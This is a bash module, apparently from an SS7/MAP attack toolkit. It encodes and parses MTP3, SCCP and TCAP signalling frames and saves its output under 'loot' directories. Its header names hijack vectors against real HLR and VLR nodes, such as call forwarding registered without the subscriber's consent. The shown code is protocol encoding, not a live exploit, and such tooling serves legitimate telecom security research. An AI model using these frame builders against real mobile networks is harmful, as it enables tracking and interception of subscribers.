#!/usr/bin/env bash
# SS7 / MAP — signalling interconnect, TCAP/MAP codec, GRX and IPX roaming
#                                                                   (tag: ss7)
#
# Capability split, per MODULE_CONVENTIONS.md §9:
#
#   * Everything encodable is encoded for real. MTP3 routing labels (ITU
#     14-bit point codes in all their structured forms), the service
#     information octet, MTP2 link-status signals, SCCP UDT/UDTS with
#     called/calling party addresses and subsystem numbers, TCAP transaction
#     and component portions, and the TS 29.002 MAP operations are built and
#     parsed here from the octets.
#   * A *vector* that needs a live signalling peer — sending an SRI at a real
#     HLR, registering a call-forwarding number at a real VLR, walking a GRX
#     from an interconnect — cannot be performed without a lab STP or an SS7
#     test interconnect. Those verbs write a plan file carrying
#     `status: handoff` and name exactly what hardware is required.
#
# Reference clause map (values asserted in --selftest are marked):
#   ITU-T Q.704 §2.2 / §14   MTP3 routing label, 14-bit point codes, SNM
#   ITU-T Q.703 §11          MTP2 LSSU status indications (SIO/SIN/SIE/SIOS/SIPO)
#   ITU-T Q.713 §3.4, §4     SCCP address indicator, GT formats, UDT/UDTS
#   ITU-T Q.773 §3           TCAP transaction/component portions, tags
#   ITU-T Q.774              TCAP procedures (begin/continue/end/abort)
#   3GPP TS 29.002 §17.4.1   MAP operation codes (local values)
#   3GPP TS 29.002 §17.7.10  MAP SS-Code values
#   3GPP TS 23.003 §8.2      IMSI / MSISDN encoding, subsystem numbers
#   GSMA IR.34               GRX/IPX interconnect and the roaming trust model
#   GSMA IR.88               roaming security (SEPP/DEA exposure)
#   Nohl 2014 (SS7 talk)     the registerSS/activateSS call-forwarding hijack
#
# Known-answer authorities used by --selftest:
#   * Wireshark 4.2.2 `tshark`: MTP3 routing-label bit layout, SCCP SSN names
#     and address-field order, TCAP component tags, the GSM MAP operation
#     table and the SS-Code table were all read back out of the dissectors
#     (text2pcap -l 141 + `tshark -V`), not invented.
#   * Oracle Communications EAGLE SS7 User's Guide, "14-Bit ITU National
#     Point Code Formats" (worked examples 14781 -> 7-55-5 in 3-8-3 and
#     14781 -> 14-6-15-1 in 4-4-4-2).
#   * TelcoBridges SSN table for the SCCP subsystem numbers Wireshark leaves
#     unnamed.
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/ss7_map"
SS7_DIR="$LOOT_DIR/ss7_map"
SS7_PLANS="$SS7_DIR/plans"
SS7_STATE="$STATE_DIR/ss7_map"
mkdir -p "$MOD_TMP" "$SS7_DIR" "$SS7_PLANS" "$SS7_STATE" 2>/dev/null

# ── sanitisation and TSV splitting ──────────────────────────────────────
# Untrusted text (a dialled number, an operator-supplied GT, a pcap field)
# reaching a TSV row must not be able to forge a row: tabs, CR and LF become
# spaces at the point of output.
ss7_sanitize() {
    printf '%s' "${1:-}" | tr '\t\r\n' '   '
}

# Split a TSV line into the global array SS7_F, preserving empty fields.
# `IFS=$'\t' read` collapses runs of tabs and shifts every later column; this
# tree has already lost a column set to that trap (MODULE_CONVENTIONS §12).
SS7_F=()
ss7_split() {
    SS7_F=()
    local i n
    n=$(printf '%s' "$1" | awk -F'\t' '{print NF}')
    for (( i = 1; i <= n; i++ )); do
        SS7_F+=("$(printf '%s' "$1" | cut -f"$i")")
    done
}

# ── numeric / hex primitives ────────────────────────────────────────────
# printf '%02X' does not truncate: a value above 255 silently emits three
# hex digits. Mask at the point of emission, never at the call site.
ss7_byte() { printf '%02X' "$(( ${1:-0} & 0xFF ))"; }
ss7_word() { printf '%04X' "$(( ${1:-0} & 0xFFFF ))"; }

ss7_nfc() {  # normalise hex: uppercase, strip separators
    local s="${1:-}"
    s="${s^^}"
    s="${s//[[:space:]]/}"
    s="${s//:/}"
    s="${s//-/}"
    printf '%s' "$s"
}

ss7_is_hex() { [[ "${1:-}" =~ ^[0-9A-Fa-f]+$ ]] && (( ${#1} % 2 == 0 )); }

# Read one hex octet at byte offset $2 of $1. Aborts nothing on bad input:
# the caller validates the whole string first.
ss7_octet() { printf '%d' "$(( 16#${1:$(( $2 * 2 )):2} ))"; }

# BER-TLV reader. Sets SS7_BTAG (2 hex chars), SS7_BLEN (decimal content
# length), SS7_BHL (header length in octets) and SS7_BVAL (content hex) for
# the TLV starting at byte offset $2 of hex string $1. Returns non-zero on a
# truncated or non-minimal length form rather than guessing.
ss7_ber_at() {
    local hex="${1^^}" off="$2"
    # Compute the hex index on its own line: inside one `local` builtin the
    # arithmetic below would see the *previous* value of `off` (bash
    # processes local declarations before the assignments are visible to
    # later words), which silently reads the TLV at the wrong offset.
    local p=$(( off * 2 ))
    (( ${#hex} >= p + 4 )) || return 1
    SS7_BTAG="${hex:$p:2}"
    [[ "$SS7_BTAG" =~ ^[0-9A-F]{2}$ ]] || return 1
    local l1=$(( 16#${hex:$((p+2)):2} )) hl=2 len
    if (( l1 < 0x80 )); then
        len=$l1
    elif (( l1 == 0x81 )); then
        (( ${#hex} >= p + 6 )) || return 1
        len=$(( 16#${hex:$((p+4)):2} )); hl=3
    elif (( l1 == 0x82 )); then
        (( ${#hex} >= p + 8 )) || return 1
        len=$(( 16#${hex:$((p+4)):2} * 256 + 16#${hex:$((p+6)):2} )); hl=4
    else
        return 1
    fi
    (( ${#hex} >= (off + hl + len) * 2 )) || return 1
    SS7_BLEN=$len
    SS7_BHL=$hl
    SS7_BVAL="${hex:$(((off + hl) * 2)):$((len * 2))}"
    return 0
}

# Build a BER-TLV from a tag and a content hex string.
ss7_tlv() {
    local tag="${1^^}" val="${2:-}"
    local len=$(( ${#val} / 2 )) lb
    if (( len < 0x80 )); then
        lb=$(ss7_byte "$len")
    elif (( len <= 0xFF )); then
        lb="81$(ss7_byte "$len")"
    else
        lb="82$(ss7_byte $(( len >> 8 )))$(ss7_byte "$len")"
    fi
    printf '%s%s%s' "$tag" "$lb" "$val"
}

# BER INTEGER (used for invoke IDs and MAP local opcodes).
ss7_ber_int() {
    local n="${1:-0}"
    [[ "$n" =~ ^[0-9]+$ ]] || return 1
    if (( n <= 0x7F )); then
        ss7_tlv 02 "$(ss7_byte "$n")"
    elif (( n <= 0x7FFF )); then
        ss7_tlv 02 "$(ss7_byte $(( n >> 8 )))$(ss7_byte "$n")"
    else
        ss7_tlv 02 "$(ss7_byte $(( n >> 16 )))$(ss7_byte $(( n >> 8 )))$(ss7_byte "$n")"
    fi
}

# ── BCD codecs ──────────────────────────────────────────────────────────
# ISDN-AddressString (TS 23.003 §3.3 / Q.931 §4.5.10): a TON/NPI octet
# followed by digits, two per octet, the FIRST digit in the LOW nibble.
# Optional second argument is the TON/NPI octet (default 0x91 = E.164
# international).
ss7_msisdn_hex() {
    local d="${1:-}" ton="${2:-91}"
    # A leading '+' is the only decoration accepted. Stripping every non-digit
    # silently ("12x4" -> "124") would build a valid frame for a number the
    # caller never typed, which is worse than refusing it.
    d="${d#+}"
    [[ "$d" =~ ^[0-9]+$ ]] || return 1
    [[ -n "$d" ]] || return 1
    (( ${#d} <= 15 )) || return 1
    (( ${#d} % 2 )) && d+="F"
    local out="$ton" i
    for (( i = 0; i < ${#d}; i += 2 )); do
        out+="${d:$((i+1)):1}${d:$i:1}"
    done
    printf '%s' "${out^^}"
}

# TBCD-STRING (IMSI, TS 23.003 §2.2): digits, two per octet, first digit in
# the LOW nibble, no TON/NPI octet. An odd count is padded with F.
ss7_imsi_hex() {
    local d="${1:-}"
    [[ "$d" =~ ^[0-9]+$ ]] || return 1
    [[ "$d" =~ ^[0-9]{5,15}$ ]] || return 1
    (( ${#d} % 2 )) && d+="F"
    local out="" i
    for (( i = 0; i < ${#d}; i += 2 )); do
        out+="${d:$((i+1)):1}${d:$i:1}"
    done
    printf '%s' "${out^^}"
}

# TBCD decode of $1: digits are two per octet, the FIRST digit in the LOW
# nibble (TS 23.003 §3.3). The pad nibble F is not a decimal digit, so it is
# dropped; $2 is accepted for callers that know the odd/even indicator but the
# decoding does not depend on it.
ss7_tbcd_digits() {
    local hex="${1^^}" i out=""
    ss7_is_hex "$hex" || return 1
    for (( i = 0; i < ${#hex}; i += 2 )); do
        out+="${hex:$((i+1)):1}${hex:$i:1}"
    done
    out="${out//F/}"
    printf '%s' "$out"
}

# ── MTP3 — Q.704 §2.2, §14 ──────────────────────────────────────────────
# Service Information Octet: bits 8-7 network indicator, bits 6-5 spare,
# bits 4-1 service indicator.
ss7_sio_parse() {
    local h; h=$(ss7_nfc "${1:-}")
    [[ "$h" =~ ^[0-9A-F]{2}$ ]] || { printf 'ERROR\tsio needs one octet of hex\n' >&2; return 1; }
    local v=$(( 16#$h ))
    printf 'sio\t%s\n'       "$(ss7_byte "$v")"
    printf 'ni\t%s\n'        "$(( (v >> 6) & 0x3 ))"
    printf 'ni_name\t%s\n'   "$(ss7_ni_name $(( (v >> 6) & 0x3 )))"
    printf 'spare\t%s\n'     "$(( (v >> 4) & 0x3 ))"
    printf 'si\t%s\n'        "$(( v & 0x0F ))"
    printf 'si_name\t%s\n'   "$(ss7_si_name $(( v & 0x0F )))"
}

# Q.704 Table 1/Q.704 (read back from Wireshark 4.2.2 mtp3.service_indicator).
ss7_si_name() {
    case "${1:-}" in
        0)  echo "Signalling Network Management Message (SNM)" ;;
        1)  echo "Maintenance Regular Message (MTN)" ;;
        2)  echo "Maintenance Special Message (MTNS)" ;;
        3)  echo "SCCP" ;;
        4)  echo "TUP" ;;
        5)  echo "ISUP" ;;
        6)  echo "DUP (call and circuit related messages)" ;;
        7)  echo "DUP (facility registration and cancellation messages)" ;;
        8)  echo "MTP testing user part" ;;
        9)  echo "Broadband ISUP" ;;
        10) echo "Satellite ISUP" ;;
        12) echo "AAL type 2 signalling" ;;
        13) echo "Bearer Independent Call Control (BICC)" ;;
        14) echo "Gateway Control Protocol" ;;
        *)  echo "spare/unknown" ;;
    esac
}

ss7_ni_name() {
    case "${1:-}" in
        0) echo "international network" ;;
        1) echo "spare (for international use only)" ;;
        2) echo "national network" ;;
        3) echo "reserved for national use" ;;
        *) echo "unknown" ;;
    esac
}

# ITU-T 14-bit point code in the 4-octet routing label.
#
# The layout was adjudicated against Wireshark 4.2.2 by setting one bit of the
# label at a time and reading back DPC/OPC/SLS (text2pcap -l 141, `tshark -V`):
#   o1 = DPC bits 7..0
#   o2 = OPC bits 1..0 (high nibble) | DPC bits 13..8 (low 6 bits)
#   o3 = OPC bits 9..2
#   o4 = SLS bits 3..0 (high nibble) | OPC bits 13..10 (low nibble)
# A real capture therefore shows the DPC split 8/6, the OPC split 2/8/4, and
# the SLS in the top nibble of the last octet.
ss7_label_build() {
    local dpc="${1:-0}" opc="${2:-0}" sls="${3:-0}"
    [[ "$dpc" =~ ^[0-9]+$ && "$opc" =~ ^[0-9]+$ && "$sls" =~ ^[0-9]+$ ]] || return 1
    (( dpc <= 16383 && opc <= 16383 && sls <= 15 )) || return 1
    local o1 o2 o3 o4
    o1=$(ss7_byte "$dpc")
    o2=$(ss7_byte $(( ((dpc >> 8) & 0x3F) | ((opc & 0x03) << 6) )))
    o3=$(ss7_byte $(( opc >> 2 )))
    o4=$(ss7_byte $(( ((opc >> 10) & 0x0F) | ((sls & 0x0F) << 4) )))
    printf '%s%s%s%s' "$o1" "$o2" "$o3" "$o4"
}

ss7_label_parse() {
    local h; h=$(ss7_nfc "${1:-}")
    [[ "$h" =~ ^[0-9A-F]{8}$ ]] || { printf 'ERROR\trouting label needs 4 octets of hex\n' >&2; return 1; }
    local o1=$(( 16#${h:0:2} )) o2=$(( 16#${h:2:2} )) o3=$(( 16#${h:4:2} )) o4=$(( 16#${h:6:2} ))
    local dpc=$(( o1 | ((o2 & 0x3F) << 8) ))
    local opc=$(( (o3 << 2) | ((o2 & 0xC0) >> 6) | ((o4 & 0x0F) << 10) ))
    local sls=$(( (o4 >> 4) & 0x0F ))
    printf 'dpc\t%s\n' "$dpc"
    printf 'opc\t%s\n' "$opc"
    printf 'sls\t%s\n' "$sls"
    return 0
}

# Structured rendering of a 14-bit point code.
#
# The widths are the ones the standards actually define, and each is a
# *complete* 14-bit split:
#   3-8-3     ITU-T international (Q.708): zone-area-signalling point.
#             Wireshark 4.2.2 renders exactly this form (`mtp3.itu_pc_structure`).
#   4-4-4-2   Oracle NPCFMTI example, a valid national split.
#   3-3-2-4-2 the five-part national split; a bare "3-3-2-4" sums to 12 and is
#             NOT a 14-bit split, so the parser rejects it (see below).
#   14        single number, the ITU national form.
ss7_pc_format() {
    local pc="${1:-}" fmt="${2:-raw}"
    [[ "$pc" =~ ^[0-9]+$ ]] || return 1
    (( pc <= 16383 )) || return 1
    local widths
    case "$fmt" in
        raw|14|single)   printf '%d' "$pc"; return 0 ;;
        3-8-3)           widths="3 8 3" ;;
        4-4-4-2)         widths="4 4 4 2" ;;
        3-3-2-4-2)       widths="3 3 2 4 2" ;;
        7-7)             widths="7 7" ;;
        *) return 1 ;;
    esac
    local total=0 w
    for w in $widths; do total=$(( total + w )); done
    (( total == 14 )) || return 1
    local out="" shift=0
    for w in $widths; do
        shift=$(( shift + w ))
        out+="$(( (pc >> (14 - shift)) & ((1 << w) - 1) ))-"
    done
    printf '%s' "${out%-}"
}

# Inverse of ss7_pc_format. Widths must sum to 14: the Oracle EAGLE
# documentation states the rule ("the sum of the values of all four parts of
# the point code format must be 14") and a split that does not satisfy it is
# rejected, not silently zero-extended.
ss7_pc_parse() {
    local str="${1:-}" fmt="${2:-raw}"
    if [[ "$fmt" == "raw" || "$fmt" == "14" || "$fmt" == "single" ]]; then
        [[ "$str" =~ ^[0-9]+$ ]] && (( str <= 16383 )) || return 1
        printf '%d' "$str"; return 0
    fi
    local widths
    case "$fmt" in
        3-8-3)     widths="3 8 3" ;;
        4-4-4-2)   widths="4 4 4 2" ;;
        3-3-2-4-2) widths="3 3 2 4 2" ;;
        7-7)       widths="7 7" ;;
        *) return 1 ;;
    esac
    local total=0 w
    for w in $widths; do total=$(( total + w )); done
    (( total == 14 )) || return 1
    # Split on '-' without leaving IFS changed for the width loop above (a
    # local IFS of '-' would stop $widths splitting on spaces).
    local -a parts=()
    local rest="$str" piece
    while [[ "$rest" == *-* ]]; do
        piece="${rest%%-*}"
        parts+=("$piece")
        rest="${rest#*-}"
    done
    parts+=("$rest")
    local n=0
    for w in $widths; do n=$(( n + 1 )); done
    (( ${#parts[@]} == n )) || return 1
    local pc=0 i=0
    for w in $widths; do
        local v="${parts[$i]}"
        [[ "$v" =~ ^[0-9]+$ ]] || return 1
        (( v < (1 << w) )) || return 1
        pc=$(( (pc << w) | v ))
        i=$(( i + 1 ))
    done
    printf '%d' "$pc"
}

# MTP2 LSSU status field — Q.703 §11, names read back from Wireshark 4.2.2
# mtp2.sf.
ss7_lssu_name() {
    case "${1:-}" in
        0) echo "SIO  (Status Indication Out of alignment)" ;;
        1) echo "SIN  (Status Indication Normal)" ;;
        2) echo "SIE  (Status Indication Emergency)" ;;
        3) echo "SIOS (Status Indication Out of Service)" ;;
        4) echo "SIPO (Status Indication Processor Outage)" ;;
        5) echo "SIB  (Status Indication Busy)" ;;
        *) echo "unknown" ;;
    esac
}

# MTP3 signalling-network-management H0/H1 — Q.704 §14, names read back from
# Wireshark 4.2.2 mtp3mg.h0 / mtp3mg.h1.
# Decimal argument, for the same reason as ss7_sccp_type_name.
ss7_mtp3_h0_name() {
    case "${1:-}" in
        1)  echo "Changeover and changeback messages" ;;
        2)  echo "Emergency changeover messages" ;;
        3)  echo "Transfer-controlled and signalling route set congestion messages" ;;
        4)  echo "Transfer prohibited-allowed-restricted messages" ;;
        5)  echo "Signalling-route-set-test messages" ;;
        6)  echo "Management inhibit messages" ;;
        7)  echo "Traffic restart messages" ;;
        8)  echo "Signalling-data-link-connection messages" ;;
        10) echo "User part flow control messages" ;;
        *)  echo "unknown" ;;
    esac
}

# ── SCCP — Q.713 §3.4, §4.2 ─────────────────────────────────────────────
# Subsystem numbers. 6/7/8/9/10 and 142/143 read back from Wireshark 4.2.2;
# 145/146/147/148/149/150/248/249/250/251/252/253/254 from the TelcoBridges
# SSN table and ITU-T Q.713 Annex. NOTE: the widely repeated claim that 146 is
# the GMLC is WRONG — 145 is GMLC (MAP) and 146 is CAP (CAMEL application
# part); both Wireshark and TelcoBridges agree. --selftest asserts the
# correct value AND that 146 is not reported as GMLC.
ss7_ssn_name() {
    case "${1:-}" in
        0)   echo "SSN not known/not used" ;;
        1)   echo "SCCP management" ;;
        2)   echo "Reserved for ITU-T allocation" ;;
        3)   echo "ISDN User Part" ;;
        4)   echo "OMAP (Operation, Maintenance, and Administration Part)" ;;
        5)   echo "MAP (Mobile Application Part)" ;;
        6)   echo "HLR (Home Location Register)" ;;
        7)   echo "VLR (Visitor Location Register)" ;;
        8)   echo "MSC (Mobile Switching Center)" ;;
        9)   echo "EIC/EIR (Equipment Identifier Center/Equipment Identification Register)" ;;
        10)  echo "AUC/AC (Authentication Center)" ;;
        11)  echo "ISDN supplementary services (ITU only)" ;;
        12)  echo "Reserved for international use (ITU only)" ;;
        13)  echo "Broadband ISDN edge-to-edge applications (ITU only)" ;;
        14)  echo "TC test responder (ITU only)" ;;
        142) echo "RANAP" ;;
        143) echo "RNSAP" ;;
        145) echo "GMLC (Gateway Mobile Location Centre, MAP)" ;;
        146) echo "CAP (CAMEL application part)" ;;
        147) echo "gsmSCF (MAP) or IM-SSF (MAP) or Presence Network Agent" ;;
        148) echo "SIWF (MAP)" ;;
        149) echo "SGSN (MAP)" ;;
        150) echo "GGSN (MAP)" ;;
        248) echo "CSS (MAP)" ;;
        249) echo "PCAP (Positioning Calculation Application Part)" ;;
        250) echo "BSC (BSSAP-LE)" ;;
        251) echo "MSC (BSSAP-LE)" ;;
        252) echo "IOS or SMLC (BSSAP-LE)" ;;
        253) echo "BSS O&M (A interface)" ;;
        254) echo "BSSAP/BSAP" ;;
        *)   echo "unknown" ;;
    esac
}

# SCCP message types — Q.713 §4, names read back from Wireshark 4.2.2.
# The argument is a DECIMAL value: a `case` pattern is literal text, so
# `0x09)` would never match the decimal 9 (MODULE_CONVENTIONS §15).
ss7_sccp_type_name() {
    case "${1:-}" in
        1)  echo "CR (Connection Request)" ;;
        2)  echo "CC (Connection Confirm)" ;;
        3)  echo "CREF (Connection Refused)" ;;
        4)  echo "RLSD (Released)" ;;
        5)  echo "RLC (Release Complete)" ;;
        6)  echo "DT1 (Data Form 1)" ;;
        7)  echo "DT2 (Data Form 2)" ;;
        8)  echo "AK (Data Acknowledgement)" ;;
        9)  echo "UDT (Unitdata)" ;;
        10) echo "UDTS (Unitdata Service)" ;;
        11) echo "ED (Expedited Data)" ;;
        12) echo "EA (Expedited Data Acknowledgement)" ;;
        13) echo "RSR (Reset Request)" ;;
        14) echo "RSC (Reset Confirmation)" ;;
        15) echo "ERR (Error)" ;;
        16) echo "IT (Inactivity Timer)" ;;
        17) echo "XUDT (Extended Unitdata)" ;;
        18) echo "XUDTS (Extended Unitdata Service)" ;;
        19) echo "LUDT (Long Unitdata)" ;;
        20) echo "LUDTS (Long Unitdata Service)" ;;
        *)  echo "unknown" ;;
    esac
}

# Address-indicator field masks, from Wireshark sccp.called.* field masks:
# bit7 NI, bit6 RI, bits5-2 GTI, bit1 SSN indicator, bit0 PC indicator.
# Q.713 puts the fields on the wire in the order AI, [PC], [SSN], [GT].
ss7_sccp_pc_hex() {  # 14-bit SCCP point code, two octets, low octet first
    local pc="${1:-0}"
    [[ "$pc" =~ ^[0-9]+$ ]] || return 1
    (( pc <= 16383 )) || return 1
    printf '%s%s' "$(ss7_byte "$pc")" "$(ss7_byte $(( (pc >> 8) & 0x3F )))"
}

ss7_sccp_addr_encode() {  # <pc> <ssn>  -> AI|PC|SSN hex
    local pc="${1:-}" ssn="${2:-}"
    [[ "$ssn" =~ ^[0-9]+$ ]] && (( ssn <= 255 )) || return 1
    printf '03%s%s' "$(ss7_sccp_pc_hex "$pc")" "$(ss7_byte "$ssn")"
}

ss7_sccp_addr_decode() {  # <hex> -> TSV
    local h; h=$(ss7_nfc "${1:-}")
    ss7_is_hex "$h" && (( ${#h} >= 2 )) || { printf 'ERROR\tparty address needs hex\n' >&2; return 1; }
    local ai=$(( 16#${h:0:2} ))
    local ni=$(( (ai >> 7) & 1 )) ri=$(( (ai >> 6) & 1 ))
    local gti=$(( (ai >> 2) & 0x0F ))
    local ssni=$(( (ai >> 1) & 1 )) pci=$(( ai & 1 ))
    printf 'address_indicator\t%s\n' "$(ss7_byte "$ai")"
    printf 'national_indicator\t%s\n' "$ni"
    printf 'routing_indicator\t%s\n' "$ri"
    printf 'routing_on\t%s\n' "$([[ $ri -eq 0 ]] && echo GT || echo SSN+PC)"
    printf 'gt_indicator\t%s\n' "$gti"
    printf 'ssn_indicator\t%s\n' "$ssni"
    printf 'pc_indicator\t%s\n' "$pci"
    local off=1
    if (( pci )); then
        (( ${#h} >= (off + 2) * 2 )) || { printf 'ERROR\taddress truncated in the point code\n' >&2; return 1; }
        local pc=$(( 16#${h:$((off*2)):2} | ((16#${h:$((off*2+2)):2} & 0x3F) << 8) ))
        printf 'pc\t%s\n' "$pc"
        off=$(( off + 2 ))
    fi
    if (( ssni )); then
        (( ${#h} >= (off + 1) * 2 )) || { printf 'ERROR\taddress truncated in the subsystem number\n' >&2; return 1; }
        local ssn=$(( 16#${h:$((off*2)):2} ))
        printf 'ssn\t%s\n' "$ssn"
        printf 'ssn_name\t%s\n' "$(ss7_ssn_name "$ssn")"
        off=$(( off + 1 ))
    fi
    if (( gti != 0 )); then
        # Global-title formats differ per GTI. GT 0100 (the MAP form) is
        # [translation type][numbering plan|encoding scheme][nature of
        # address][TBCD digits]; the GTI itself lives in the address
        # indicator, there is no separate GTI octet on the wire. The digit
        # unpacking below reproduces what Wireshark 4.2.2 reports for
        # 33 61 23 45 67 F8 with the odd/even bit set: 33163254768.
        printf 'gt_hex\t%s\n' "${h:$((off*2))}"
        if (( gti == 4 )) && (( ${#h} >= (off + 3) * 2 )); then
            local ttoct npes nai
            ttoct=$(( 16#${h:$(((off)*2)):2} ))
            npes=$((  16#${h:$(((off+1)*2)):2} ))
            nai="${h:$(((off+2)*2)):2}"
            printf 'gt_translation_type\t%s\n' "$ttoct"
            printf 'gt_numbering_plan\t%s\n'   "$(( npes >> 4 ))"
            printf 'gt_encoding_scheme\t%s\n'  "$(( npes & 0x0F ))"
            printf 'gt_nai_raw\t%s\n'          "$nai"
            local dig="${h:$(((off+3)*2))}"
            printf 'gt_digits\t%s\n' "$(ss7_tbcd_digits "$dig" "$(( npes & 1 ))")"
        fi
    fi
    return 0
}

# UDT/UDTS builder.
#
# The three pointer octets are offsets relative to the octet that contains
# the pointer (Q.713 §4.2, and exactly how Wireshark's VARIABLE_POINTER macro
# resolves them: `var += offset`). The message is
#   09|0A  class  p1 p2 p3  [len called][called] [len calling][calling] [len data][data]
# where p1 is measured from the p1 octet, p2 from the p2 octet, p3 from the
# p3 octet.
ss7_sccp_build_udt() {
    local cpc="${1:-}" cssn="${2:-}" opc="${3:-}" ossn="${4:-}" data="${5:-}" mtype="${6:-09}"
    local called calling dlen
    called=$(ss7_sccp_addr_encode "$cpc" "$cssn") || return 1
    calling=$(ss7_sccp_addr_encode "$opc" "$ossn") || return 1
    data=$(ss7_nfc "$data"); ss7_is_hex "$data" || data=""
    dlen=$(( ${#data} / 2 ))
    (( dlen <= 254 )) || { printf 'ERROR\tSCCP data exceeds the unitdata length octet\n' >&2; return 1; }
    local clen=$(( ${#called} / 2 )) olen=$(( ${#calling} / 2 ))
    (( clen <= 255 && olen <= 255 )) || return 1
    local p1_off=5
    local p2_off=$(( p1_off + 1 + clen ))
    local p3_off=$(( p2_off + 1 + olen ))
    printf '%s%s%s%s%s%s%s%s%s' \
        "$mtype" "00" \
        "$(ss7_byte $(( p1_off - 2 )))" \
        "$(ss7_byte $(( p2_off - 3 )))" \
        "$(ss7_byte $(( p3_off - 4 )))" \
        "$(ss7_byte "$clen")" "$called" \
        "$(ss7_byte "$olen")" "$calling"
    printf '%s%s' "$(ss7_byte "$dlen")" "$data"
}

ss7_sccp_parse() {
    local h; h=$(ss7_nfc "${1:-}")
    ss7_is_hex "$h" && (( ${#h} >= 6 )) || { printf 'ERROR\tSCCP message needs hex\n' >&2; return 1; }
    local mt=$(( 16#${h:0:2} ))
    printf 'sccp_message_type\t%s\n' "$(ss7_byte "$mt")"
    printf 'sccp_message_name\t%s\n' "$(ss7_sccp_type_name "$mt")"
    local cls=$(( 16#${h:2:2} ))
    printf 'sccp_class\t%s\n' "$(( (cls >> 4) & 0x0F ))"
    local p1=$(( 16#${h:4:2} )) p2 p3
    local doff coff xoff
    doff=$(( p1 + 2 ))
    (( ${#h} >= (doff + 1) * 2 )) || { printf 'ERROR\tSCCP pointer to the called party address is outside the message\n' >&2; return 1; }
    if (( ${#h} >= 10 )); then
        p2=$(( 16#${h:6:2} )); p3=$(( 16#${h:8:2} ))
        coff=$(( p2 + 3 )); xoff=$(( p3 + 4 ))
        # Q.713 §1.4: the parameters follow one another in the order the
        # pointers name, so each pointer has to point past the previous one.
        (( p2 > p1 )) || { printf 'ERROR\tSCCP pointers are out of order (called %s, calling %s)\n' "$p1" "$p2" >&2; return 1; }
        (( p3 > p2 )) || { printf 'ERROR\tSCCP pointers are out of order (calling %s, data %s)\n' "$p2" "$p3" >&2; return 1; }
    else
        coff=0; xoff=0
    fi
    # A length octet that promises more octets than the message carries is a
    # mangled frame, not a short parameter: refuse it rather than print the
    # part that happens to be there, which reads as a complete decode.
    local clen=$(( 16#${h:$((doff*2)):2} ))
    (( (doff + 1 + clen) * 2 <= ${#h} )) || { printf 'ERROR\tcalled party address length %s runs past the message\n' "$clen" >&2; return 1; }
    local called="${h:$(((doff+1)*2)):$((clen*2))}"
    printf 'called_party\t%s\n' "$called"
    ss7_sccp_addr_decode "$called" | sed 's/^/called_/'
    if (( coff > 0 )); then
        (( (coff + 1) * 2 <= ${#h} )) || { printf 'ERROR\tcalling party address pointer runs past the message\n' >&2; return 1; }
        local olen=$(( 16#${h:$((coff*2)):2} ))
        (( (coff + 1 + olen) * 2 <= ${#h} )) || { printf 'ERROR\tcalling party address length %s runs past the message\n' "$olen" >&2; return 1; }
        local calling="${h:$(((coff+1)*2)):$((olen*2))}"
        printf 'calling_party\t%s\n' "$calling"
        ss7_sccp_addr_decode "$calling" | sed 's/^/calling_/'
    fi
    if (( xoff > 0 )); then
        (( (xoff + 1) * 2 <= ${#h} )) || { printf 'ERROR\tuser data pointer runs past the message\n' >&2; return 1; }
        local dln=$(( 16#${h:$((xoff*2)):2} ))
        (( (xoff + 1 + dln) * 2 <= ${#h} )) || { printf 'ERROR\tuser data length %s runs past the message\n' "$dln" >&2; return 1; }
        local data="${h:$(((xoff+1)*2)):$((dln*2))}"
        printf 'sccp_data\t%s\n' "$data"
    fi
    return 0
}

# Full MSU: SIO | routing label | SCCP.  This is the octet image an M3UA
# DATA message carries after its own header.
ss7_msu_build() {
    local dpc="${1:-1}" opc="${2:-2}" sls="${3:-0}" sccp="${4:-}"
    ss7_is_hex "$sccp" || return 1
    printf '83%s%s' "$(ss7_label_build "$dpc" "$opc" "$sls")" "$sccp"
}

# ── TCAP — Q.773 §3 ─────────────────────────────────────────────────────
# Transaction-portion tags: BEGIN 0x62, UNIDIRECTIONAL 0x61, END 0x64,
# CONTINUE 0x65, ABORT 0x67. Identifier tags: OTID 0x48, DTID 0x49,
# dialogue portion 0x6B, component portion 0x6C.
ss7_tcap_msg_name() {
    case "${1^^}" in
        61) echo "unidirectional" ;;
        62) echo "begin" ;;
        64) echo "end" ;;
        65) echo "continue" ;;
        67) echo "abort" ;;
        *)  echo "unknown" ;;
    esac
}

# Component tags — Q.773 §3.3: invoke [1], returnResultLast [2], returnError
# [3], reject [4], returnResultNotLast [7]. Wireshark 4.2.2 names the same
# five (its tag 2 is what it calls returnResultLast).
ss7_tcap_component_name() {
    case "${1^^}" in
        A1) echo "invoke" ;;
        A2) echo "returnResultLast" ;;
        A3) echo "returnError" ;;
        A4) echo "reject" ;;
        A7) echo "returnResultNotLast" ;;
        *)  echo "unknown" ;;
    esac
}

# Wrap a component portion inside a BEGIN transaction.
ss7_tcap_begin() {
    local otid="${1:-00000001}" comps="${2:-}"
    otid=$(ss7_nfc "$otid"); ss7_is_hex "$otid" || return 1
    ss7_is_hex "$comps" || return 1
    local inner
    inner="$(ss7_tlv 48 "$otid")$(ss7_tlv 6C "$comps")"
    ss7_tlv 62 "$inner"
}

